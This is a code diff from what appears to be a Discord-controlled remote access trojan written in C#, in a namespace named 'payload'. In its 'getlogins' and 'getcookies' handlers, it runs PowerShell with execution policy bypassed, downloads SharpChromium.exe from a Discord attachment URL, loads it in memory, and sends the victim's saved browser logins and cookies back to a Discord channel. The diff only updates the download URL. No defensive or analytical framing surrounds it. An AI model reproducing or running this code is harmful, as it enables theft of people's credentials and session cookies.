@@ -185,7 +185,7 @@ namespace payload
                     }
                 case "getlogins":
                     {
-                        string output = Utils.Execute("powershell.exe", "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/967059139203309688/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))");
+                        string output = Utils.Execute("powershell.exe", "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/974898522820321331/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('logins')))");
                         MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(output));
                         await message.Channel.SendFileAsync(ms, "unknown.txt", "SharpChromium output:");
                         ms.Dispose();
@@ -193,7 +193,7 @@ namespace payload
                     }
                 case "getcookies":
                     {
-                        string output = Utils.Execute("powershell.exe", "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/967059139203309688/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('cookies')))");
+                        string output = Utils.Execute("powershell.exe", "-noprofile -executionpolicy bypass -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData('https://cdn.discordapp.com/attachments/961905736139554876/974898522820321331/SharpChromium.exe');$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('cookies')))");
                         List<FileAttachment> paths = new List<FileAttachment>();
                         string[] lines = output.Split('\n');
                         foreach (string l in lines)
